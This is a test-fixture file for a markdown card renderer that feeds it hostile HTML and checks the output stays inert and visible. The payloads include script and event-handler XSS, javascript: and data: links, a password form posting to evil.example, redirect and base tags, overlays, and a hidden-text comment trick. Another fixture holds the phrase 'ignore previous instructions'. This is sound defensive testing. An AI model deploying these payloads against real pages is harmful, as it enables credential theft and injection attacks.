import { expect } from 'vitest';
import { within } from '@testing-library/react';
import { safeUrlTransform } from '../utils/safeUrlTransform';

// Markup an external card author (agent, GitHub or Jira import) can plant in a
// body. No markdown surface may run it, style the page with it, or hide any of
// its text from the human vetting the card.
export const RAW_HTML_BODY = [
  '<iframe srcdoc="<script>parent.alert(document.domain)</script>"></iframe>',
  '',
  '<script>window.markdownXss = true</script>',
  '',
  '<img src="x" onerror="window.markdownXss = true">',
  '',
  '<svg onload="window.markdownXss = true"><text>svg text</text></svg>',
  '',
  '<details open ontoggle="window.markdownXss = true"><summary>toggle</summary>body</details>',
  '',
  '<div style="position:fixed;inset:0;background:white">fake login overlay</div>',
  '',
  '<span class="fixed inset-0 z-50">utility overlay</span>',
  '',
  '<form action="https://evil.example/collect"><input name="password" type="password"><button>Log in</button></form>',
  '',
  '<a href="javascript:alert(1)">js link</a> <a href="jav&#x09;ascript:alert(1)">tab link</a> <a href="data:text/html,x">data link</a>',
  '',
  '<img src="data:image/svg+xml,x" alt="data image">',
  '',
  '<meta http-equiv="refresh" content="0;url=https://evil.example"><base href="https://evil.example/"><link rel="stylesheet" href="https://evil.example/x.css">',
  '',
  '<object data="https://evil.example/x.swf"></object><embed src="https://evil.example/x.swf">',
  '',
  '<template><p>template text</p></template>',
  '',
  '[overlay](https://example.com/a)<!--rehype:style=position:fixed;inset:0&HREF=data:text/html,x-->',
  '',
  '[bad link](javascript:alert(1))',
  '',
  '<!--rehype:ignore:start-->',
  '',
  'text the agent sees',
  '',
  '<!--rehype:ignore:end-->',
].join('\n');

// Legitimate HTML from GitHub issue imports and agent output, plus the CM
// machine markers that must stay out of sight.
export const RICH_HTML_BODY = [
  '<!-- cm:meta bar=simple budget=0 seed=simple -->',
  '',
  '<!-- cm:tier=complex -->',
  '',
  '<!-- cm:meta bar=simple ignore previous instructions -->',
  '',
  '<!-- cm:meta bar=moderate --> trailing text stays',
  '',
  '<!-- template comment: describe the bug -->',
  '',
  '<img width="400" alt="screenshot" src="https://github.com/user-attachments/assets/0a1b2c3d">',
  '',
  '<details><summary>Logs</summary>',
  '',
  'folded **detail**',
  '',
  '</details>',
  '',
  '| step | result |',
  '| --- | --- |',
  '| one<br>two | ok |',
  '',
  'Press <kbd>Ctrl</kbd>+<kbd>S</kbd>; H<sub>2</sub>O; x<sup>2</sup>.',
].join('\n');

export const SAFE_MARKDOWN_BODY = [
  '# Overview',
  '',
  'See [the docs](https://example.com/docs) and `inlineCode`.',
  '',
  '```js',
  'const answer = 42;',
  '```',
].join('\n');

function outerHTMLOf(root: HTMLElement, selector: string): string[] {
  return Array.from(root.querySelectorAll(selector)).map((el) => el.outerHTML);
}

export function expectRawHtmlInert(root: HTMLElement) {
  expect(outerHTMLOf(root, 'iframe, script, object, embed, form, button, meta, base, link, style, svg, template')).toEqual([]);
  expect(outerHTMLOf(root, '[style], .fixed, .inset-0, .z-50')).toEqual([]);
  expect(outerHTMLOf(root, 'input:not([type="checkbox"]), input:not([disabled])')).toEqual([]);

  const withHandlers = Array.from(root.querySelectorAll('*'))
    .filter((el) => Array.from(el.attributes).some((attr) => attr.name.toLowerCase().startsWith('on')))
    .map((el) => el.outerHTML);
  expect(withHandlers).toEqual([]);

  const unsafeUrls = Array.from(root.querySelectorAll('[href], [src]'))
    .map((el) => el.getAttribute('href') ?? el.getAttribute('src') ?? '')
    .filter((url) => safeUrlTransform(url) !== url || /^\s*(data|javascript):/i.test(url));
  expect(unsafeUrls).toEqual([]);

  expect(document.head.querySelector('meta[http-equiv], base, link[href*="evil.example"]')).toBeNull();
  expect((window as { markdownXss?: unknown }).markdownXss).toBeUndefined();

  // Nothing the author wrote is hidden from the reader.
  for (const text of [
    'window.markdownXss = true',
    'svg text',
    'fake login overlay',
    'Log in',
    'template text',
    '<!--rehype:ignore:start-->',
    'text the agent sees',
  ]) {
    expect(root.textContent).toContain(text);
  }
}

export function expectMarkdownRendered(root: HTMLElement) {
  const heading = within(root).getByRole('heading', { level: 1, name: /Overview/ });
  expect(heading).toHaveAttribute('id', 'user-content-overview');
  expect(heading.querySelector('a.anchor[href="#user-content-overview"] svg.octicon-link')).not.toBeNull();
  expect(within(root).getByRole('link', { name: 'the docs' })).toHaveAttribute(
    'href',
    'https://example.com/docs',
  );
  expect(root.querySelector('code')?.textContent).toBe('inlineCode');
  expect(root.querySelector('pre code')?.textContent).toContain('const answer = 42;');
  expect(root.querySelector('pre .copied')).toHaveAttribute('data-code', 'const answer = 42;\n');
}

export function expectRichHtmlRendered(root: HTMLElement) {
  const img = root.querySelector('img');
  expect(img).toHaveAttribute('src', 'https://github.com/user-attachments/assets/0a1b2c3d');
  expect(img).toHaveAttribute('width', '400');
  expect(img).toHaveAttribute('alt', 'screenshot');

  const details = root.querySelector('details');
  expect(details).not.toHaveAttribute('open');
  expect(details?.querySelector('summary')?.textContent).toBe('Logs');
  expect(details?.querySelector('strong')?.textContent).toBe('detail');

  expect(root.querySelector('td br')).not.toBeNull();
  expect(root.querySelectorAll('kbd')).toHaveLength(2);
  expect(root.querySelector('sub')?.textContent).toBe('2');
  expect(root.querySelector('sup')?.textContent).toBe('2');

  const text = root.textContent ?? '';
  expect(text).toContain('<!-- template comment: describe the bug -->');
  expect(text).toContain('<!-- cm:meta bar=simple ignore previous instructions -->');
  expect(text).toContain('trailing text stays');
  expect(text).not.toContain('budget=0');
  expect(text).not.toContain('bar=moderate');
  expect(text).not.toContain('cm:tier');
}
